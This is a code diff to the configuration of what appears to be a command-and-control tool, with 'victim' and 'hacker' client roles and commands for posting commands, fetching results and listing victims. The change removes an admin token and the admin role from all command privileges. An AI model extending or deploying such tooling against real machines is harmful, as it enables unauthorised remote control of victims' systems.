@@ -397,7 +397,6 @@ class Config:
 
         # ---- Tokens
         self.auth_token = self.get_token("auth_token")
-        self.admin_token = self.get_token("admin_token")
         self.hacker_token = self.get_token("hacker_token")
 
         # ---- Server Commands
@@ -409,23 +408,34 @@ class Config:
         self.server_cmd_privileges = {
             ut.ServerCommands.register: [
                 ut.ClientType.victim,
-                ut.ClientType.admin,
                 ut.ClientType.hacker,
             ],
-            ut.ServerCommands.fetch_cmd: [ut.ClientType.victim, ut.ClientType.admin],
-            ut.ServerCommands.post_res: [ut.ClientType.victim, ut.ClientType.admin],
-            ut.ServerCommands.post_cmd: [ut.ClientType.hacker, ut.ClientType.admin],
-            ut.ServerCommands.fetch_res: [ut.ClientType.hacker, ut.ClientType.admin],
+            ut.ServerCommands.fetch_cmd: [
+                ut.ClientType.victim,
+            ],
+            ut.ServerCommands.post_res: [
+                ut.ClientType.victim,
+            ],
+            ut.ServerCommands.post_cmd: [
+                ut.ClientType.hacker,
+            ],
+            ut.ServerCommands.fetch_res: [
+                ut.ClientType.hacker,
+            ],
             ut.ServerCommands.create_session: [
                 ut.ClientType.hacker,
-                ut.ClientType.admin,
             ],
-            ut.ServerCommands.get_session: [ut.ClientType.victim, ut.ClientType.admin],
-            ut.ServerCommands.list_victims: [ut.ClientType.hacker, ut.ClientType.admin],
-            ut.ServerCommands.exit_session: [ut.ClientType.hacker, ut.ClientType.admin],
+            ut.ServerCommands.get_session: [
+                ut.ClientType.victim,
+            ],
+            ut.ServerCommands.list_victims: [
+                ut.ClientType.hacker,
+            ],
+            ut.ServerCommands.exit_session: [
+                ut.ClientType.hacker,
+            ],
             ut.ServerCommands.delete_hacker: [
                 ut.ClientType.hacker,
-                ut.ClientType.admin,
             ],
         }
 
